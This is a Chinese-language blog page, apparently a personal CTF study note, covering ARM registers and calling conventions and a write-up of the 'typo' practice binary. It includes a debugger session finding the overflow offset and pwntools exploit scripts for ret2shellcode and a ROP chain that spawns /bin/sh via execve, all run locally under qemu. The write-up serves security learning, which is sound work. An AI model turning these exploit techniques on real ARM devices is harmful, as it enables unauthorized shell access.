@@ -1,0 +1,669 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>arm pwn | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="arm汇编寄存器在ARMv6-M与ARMv7-M的处理器中有30个32bit位宽度的通用寄存器。前16个寄存器是用户层可访问控制的，其他的寄存器在高权限进程中可以访问（但ARMv6-M与ARMv7-M除外）    寄存器 别名 用途    R0–R10  通用寄存器   R7  一般用来存放系统调用号   R11 FP 栈帧指针   R12 IP 内部程序调用   R13 SP 栈指针   R14">
+<meta name="keywords" content="pwn,栈溢出,arm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="arm pwn">
+<meta property="og:url" content="p1Kk.github.io/2020/01/01/异构pwn/arm pwn/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="arm汇编寄存器在ARMv6-M与ARMv7-M的处理器中有30个32bit位宽度的通用寄存器。前16个寄存器是用户层可访问控制的，其他的寄存器在高权限进程中可以访问（但ARMv6-M与ARMv7-M除外）    寄存器 别名 用途    R0–R10  通用寄存器   R7  一般用来存放系统调用号   R11 FP 栈帧指针   R12 IP 内部程序调用   R13 SP 栈指针   R14">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20220713112019562.png">
+<meta property="og:updated_time" content="2022-07-14T15:37:41.467Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="arm pwn">
+<meta name="twitter:description" content="arm汇编寄存器在ARMv6-M与ARMv7-M的处理器中有30个32bit位宽度的通用寄存器。前16个寄存器是用户层可访问控制的，其他的寄存器在高权限进程中可以访问（但ARMv6-M与ARMv7-M除外）    寄存器 别名 用途    R0–R10  通用寄存器   R7  一般用来存放系统调用号   R11 FP 栈帧指针   R12 IP 内部程序调用   R13 SP 栈指针   R14">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20220713112019562.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2020/01/01/异构pwn/arm pwn/" title="arm pwn" itemprop="url">arm pwn</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2019-12-31T16:00:00.000Z" itemprop="datePublished"> Published 2020-01-01</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#arm汇编"><span class="toc-number">1.</span> <span class="toc-text">arm汇编</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#寄存器"><span class="toc-number">1.1.</span> <span class="toc-text">寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见指令"><span class="toc-number">1.2.</span> <span class="toc-text">常见指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARM模式和Thumb模式"><span class="toc-number">1.3.</span> <span class="toc-text">ARM模式和Thumb模式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#arm函数调用约定"><span class="toc-number">2.</span> <span class="toc-text">arm函数调用约定</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#练习题-typo"><span class="toc-number">3.</span> <span class="toc-text">练习题-typo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">3.2.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop"><span class="toc-number">3.3.</span> <span class="toc-text">rop</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#websrv"><span class="toc-number">4.</span> <span class="toc-text">websrv</span></a></li></ol>
+		  
+		  </div>
+		  
+		  <h1 id="arm汇编"><a href="#arm汇编" class="headerlink" title="arm汇编"></a>arm汇编</h1><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>在ARMv6-M与ARMv7-M的处理器中有30个32bit位宽度的通用寄存器。前16个寄存器是用户层可访问控制的，其他的寄存器在高权限进程中可以访问（但ARMv6-M与ARMv7-M除外）</p>
+<table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th align="left">别名</th>
+<th align="left">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">R0–R10</td>
+<td align="left"></td>
+<td align="left">通用寄存器</td>
+</tr>
+<tr>
+<td align="left">R7</td>
+<td align="left"></td>
+<td align="left">一般用来存放系统调用号</td>
+</tr>
+<tr>
+<td align="left">R11</td>
+<td align="left">FP</td>
+<td align="left">栈帧指针</td>
+</tr>
+<tr>
+<td align="left">R12</td>
+<td align="left">IP</td>
+<td align="left">内部程序调用</td>
+</tr>
+<tr>
+<td align="left">R13</td>
+<td align="left">SP</td>
+<td align="left">栈指针</td>
+</tr>
+<tr>
+<td align="left">R14</td>
+<td align="left">LR</td>
+<td align="left">链接寄存器（一般存放函数的返回地址）</td>
+</tr>
+<tr>
+<td align="left">R15</td>
+<td align="left">PC</td>
+<td align="left">程序计数寄存器</td>
+</tr>
+<tr>
+<td align="left">CPSR</td>
+<td align="left">-</td>
+<td align="left">当前程序状态寄存器</td>
+</tr>
+</tbody></table>
+<p>ARMv7相较于同为32位的x86，寄存器的数量要多一些，名称和配置也不尽相同，但两者有一个基本的对照关系：</p>
+<table>
+<thead>
+<tr>
+<th align="left">ARM</th>
+<th align="left">描述</th>
+<th align="left">x86</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">R0</td>
+<td align="left">通用寄存器</td>
+<td align="left">EAX</td>
+</tr>
+<tr>
+<td align="left">R1-R5</td>
+<td align="left">通用寄存器</td>
+<td align="left">EBX、ECX、EDX、ESI、EDI</td>
+</tr>
+<tr>
+<td align="left">R6-R10</td>
+<td align="left">通用寄存器</td>
+<td align="left">-</td>
+</tr>
+<tr>
+<td align="left">R11</td>
+<td align="left">栈帧指针</td>
+<td align="left">EBP</td>
+</tr>
+<tr>
+<td align="left">R12</td>
+<td align="left">内部程序调用</td>
+<td align="left">-</td>
+</tr>
+<tr>
+<td align="left">R13</td>
+<td align="left">栈指针</td>
+<td align="left">ESP</td>
+</tr>
+<tr>
+<td align="left">R14</td>
+<td align="left">链接寄存器</td>
+<td align="left">-</td>
+</tr>
+<tr>
+<td align="left">R15</td>
+<td align="left">程序计数寄存器/机器码指针</td>
+<td align="left">EIP</td>
+</tr>
+<tr>
+<td align="left">CPSR</td>
+<td align="left">程序状态寄存器</td>
+<td align="left">FLAGS</td>
+</tr>
+</tbody></table>
+<p>自从ARMv8出现以后，ARM的寄存器就全面进入了64位时代，通用寄存器的数量从13个(R0-R12)变成了30个(X0-X29) ，其名称中的”<strong>R</strong>“也被”<strong>X</strong>“所取代了，但为了保持和32位系统的兼容性，每个ARMv8/ARM64通用寄存器都可被当做2个32位寄存器来使用，这样的32位寄存器用”<strong>W</strong>n”来表示。</p>
+<h2 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h2><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20220713112019562.png" alt="image-20220713112019562"></p>
+<h2 id="ARM模式和Thumb模式"><a href="#ARM模式和Thumb模式" class="headerlink" title="ARM模式和Thumb模式"></a>ARM模式和Thumb模式</h2><h1 id="arm函数调用约定"><a href="#arm函数调用约定" class="headerlink" title="arm函数调用约定"></a>arm函数调用约定</h1><p>32位</p>
+<ul>
+<li>参数1-参数4 分别保存到 R0-R3 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 R0 中。</li>
+</ul>
+<p>64位</p>
+<ul>
+<li>参数1-参数8 分别保存到 X0-X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。</li>
+</ul>
+<h1 id="练习题-typo"><a href="#练习题-typo" class="headerlink" title="练习题-typo"></a>练习题-<a href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/typo" target="_blank" rel="noopener">typo</a></h1><p>调试方式同理mips</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-multiarch -x mygdb.cfg ./arm-bin			# gdb-multiarch指定config文件，一些预设gdb命令可以直接写在cfg文件里，比如set arch...</span><br><span class="line"></span><br><span class="line">$ sudo apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br><span class="line">$ sudo apt install libc6-arm64-cross			# 安装arm64的lib库</span><br><span class="line"></span><br><span class="line">$ qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>checksec</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kk/pwn/typo&apos;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-arm ./typo</span><br></pre></td></tr></table></figure>
+
+<p>测试栈溢出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-arm -g 1234 ./typo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-multiarch ./typo</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> R0   0x0</span><br><span class="line">*R1   0xfffef004 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*R2   0x7e</span><br><span class="line"> R3   0x0</span><br><span class="line">*R4   0x62616162 (<span class="string">'baab'</span>)</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x0</span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line">*R9   0xa5ec ◂— push   &#123;r3, r4, r5, r6, r7, r8, sb, lr&#125;</span><br><span class="line">*R10  0xa68c ◂— push   &#123;r3, r4, r5, lr&#125;</span><br><span class="line">*R11  0x62616163 (<span class="string">'caab'</span>)</span><br><span class="line"> R12  0x0</span><br><span class="line">*SP   0xfffef078 ◂— <span class="string">'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">*PC   0x62616164 (<span class="string">'daab'</span>)</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ sp  0xfffef078 ◂— <span class="string">'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">01:0004│     0xfffef07c ◂— <span class="string">'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">02:0008│     0xfffef080 ◂— <span class="string">'gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">03:000c│     0xfffef084 ◂— <span class="string">'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">04:0010│     0xfffef088 ◂— <span class="string">'iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">05:0014│     0xfffef08c ◂— <span class="string">'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">06:0018│     0xfffef090 ◂— <span class="string">'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">07:001c│     0xfffef094 ◂— <span class="string">'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 62616164</span><br><span class="line">───────────────────────────────</span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'arm'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process([<span class="string">'qemu-arm'</span>,<span class="string">'./typo'</span>])</span><br><span class="line"><span class="comment"># io = process(['qemu-arm',"-g","1234",'./typo'])</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">"\n"</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>) + p32(<span class="number">0xfffef000</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>实现<code>execve(&quot;/bin/sh&quot;, 0, 0)</code></p>
+<p> 通过ARM提供的系统调用指令svc切换到 svc 模式，将ARM下的存放系统调用号寄存器R7设置为0xb（execve的调用号），R0设置为”/bin/sh”，R1、R2设置为0。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./typo --string /bin/sh</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0006c384 : /bin/sh</span><br><span class="line"></span><br><span class="line">$ ROPgadget --binary ./typo --only &quot;pop&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00008d1c : pop &#123;fp, pc&#125;</span><br><span class="line">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br><span class="line">0x00068bec : pop &#123;r1, pc&#125;</span><br><span class="line">0x00008160 : pop &#123;r3, pc&#125;</span><br><span class="line">0x0000ab0c : pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">0x0000a958 : pop &#123;r3, r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x00008a3c : pop &#123;r3, r4, r5, r6, r7, r8, fp, pc&#125;</span><br><span class="line">0x0000a678 : pop &#123;r3, r4, r5, r6, r7, r8, sb, pc&#125;</span><br><span class="line">0x00008520 : pop &#123;r3, r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span><br><span class="line">0x00068c68 : pop &#123;r3, r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x00014a70 : pop &#123;r3, r4, r7, pc&#125;</span><br><span class="line">0x00008de8 : pop &#123;r4, fp, pc&#125;</span><br><span class="line">0x000083b0 : pop &#123;r4, pc&#125;</span><br><span class="line">0x00008eec : pop &#123;r4, r5, fp, pc&#125;</span><br><span class="line">0x00009284 : pop &#123;r4, r5, pc&#125;</span><br><span class="line">0x000242e0 : pop &#123;r4, r5, r6, fp, pc&#125;</span><br><span class="line">0x000095b8 : pop &#123;r4, r5, r6, pc&#125;</span><br><span class="line">0x000212ec : pop &#123;r4, r5, r6, r7, fp, pc&#125;</span><br><span class="line">0x000082e8 : pop &#123;r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x00043110 : pop &#123;r4, r5, r6, r7, r8, fp, pc&#125;</span><br><span class="line">0x00011648 : pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x00048e9c : pop &#123;r4, r5, r6, r7, r8, sb, fp, pc&#125;</span><br><span class="line">0x0000a5a0 : pop &#123;r4, r5, r6, r7, r8, sb, pc&#125;</span><br><span class="line">0x0000870c : pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span><br><span class="line">0x00011c24 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class="line">0x000553cc : pop &#123;r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x00023ed4 : pop &#123;r4, r5, r7, pc&#125;</span><br><span class="line">0x00023dbc : pop &#123;r4, r7, pc&#125;</span><br><span class="line">0x00014068 : pop &#123;r7, pc&#125;</span><br><span class="line"></span><br><span class="line"># pop没有控制R2寄存器的指令，所以考虑通过mov传递，查找mov r2, #0没有合适的</span><br><span class="line">$ ROPgadget --binary ./typo | grep &apos;mov r2, r4&apos;</span><br><span class="line">0x0003338c : mov r2, r4 ; blx r3</span><br><span class="line">0x0000f600 : mov r2, r4 ; blx sb</span><br><span class="line">0x00069950 : mov r2, r4 ; mov r3, r4 ; blx r8</span><br><span class="line">0x00013310 : mov r2, r4 ; mov r3, r5 ; blx r1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ ROPgadget --binary ./typo | grep &apos;svc #0&apos;</span><br><span class="line">0x00021b84 : add r1, sp, #8 ; mov r7, #0x108 ; svc #0 ; ldr r3, [pc, #0x48c] ; cmn r0, #0x1000 ; movls r0, r3 ; mvnhi r0, #0 ; add sp, sp, #0x28 ; pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x00021b54 : add r1, sp, #8 ; mov r7, #0x108 ; svc #0 ; ldr r3, [pc, #0x4bc] ; cmn r0, #0x1000 ; movls r0, r3 ; mvnhi r0, #0 ; add sp, sp, #0x28 ; pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x000482e4 : andeq lr, r7, r0, lsr #1 ; andeq lr, r7, r8, ror r0 ; andeq lr, r7, r4, ror #1 ; andeq lr, r7, r4, rrx ; str r7, [sp, #-4]! ; mov r7, #0xc7 ; svc #0 ; pop &#123;r7&#125; ; bx lr</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>我们利用的gadget为：</p>
+<p>binsh   0x0006c384 : /bin/sh</p>
+<p>g1        0x00020904 : pop {r0, r4, pc}</p>
+<p>g2        0x00068bec : pop {r1, pc}</p>
+<p>g3        0x00014a70 : pop {r3, r4, r7, pc}</p>
+<p>g4        0x0003338c : mov r2, r4 ; blx r3</p>
+<p>svc       0x000482fc : svc #0 ; pop {r7} ; bx lr</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&apos;arm&apos;,log_level=&apos;debug&apos;)</span><br><span class="line">io = process([&apos;qemu-arm&apos;,&apos;./typo&apos;])</span><br><span class="line"># io = process([&apos;qemu-arm&apos;,&quot;-g&quot;,&quot;1234&quot;,&apos;./typo&apos;])</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(&quot;\n&quot;)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload = p32(0x00020904) + p32(0x0006c384) + p32(0) + p32(0x00068bec) + p32(0) + p32(0x00014a70) </span><br><span class="line"># 				 g1			r0=&quot;/bin/sh&quot;	   r4=0		   pc=g2		 r1=0		pc=g3			</span><br><span class="line"></span><br><span class="line">payload += p32(0x000482fc) + p32(0) + p32(0xb) + p32(0x0003338c)</span><br><span class="line"># 				 r3=svc		  r4=0	   r7=0xb		pc=g4</span><br><span class="line">exp = &apos;a&apos;*112 + payload</span><br><span class="line"></span><br><span class="line">io.sendline(exp)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="websrv"><a href="#websrv" class="headerlink" title="websrv"></a><a href="https://github.com/ReAbout/pwn-exercise-iot/blob/main/linux_arm_stack/arm_pwn_websrv/websrv_hard" target="_blank" rel="noopener">websrv</a></h1><blockquote>
+<p>ref:</p>
+<p><a href="https://song-10.gitee.io/2020/12/27/arm-pwn-2020-12-29-arm-start/" target="_blank" rel="noopener">https://song-10.gitee.io/2020/12/27/arm-pwn-2020-12-29-arm-start/</a></p>
+<p><a href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/" target="_blank" rel="noopener">https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/</a></p>
+<p><a href="https://github.com/ReAbout/pwn-exercise-iot" target="_blank" rel="noopener">https://github.com/ReAbout/pwn-exercise-iot</a></p>
+</blockquote>
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/笔记/">笔记</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/栈溢出/">栈溢出</a><a href="/tags/arm/">arm</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2020/01/01/异构pwn/mips pwn/" title="mips pwn">
+  <span>
+  mips pwn</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/12/03/0CTF2017 babyheap/wp/"  title="0ctf2017 babyheap wp">
+ <span>0ctf2017 babyheap wp
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>20</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞复现/" title="漏洞复现">漏洞复现<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>23</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>38</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>24</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tw/" title="tw">tw<sup>16</sup></a></li>
+			
+		
+			
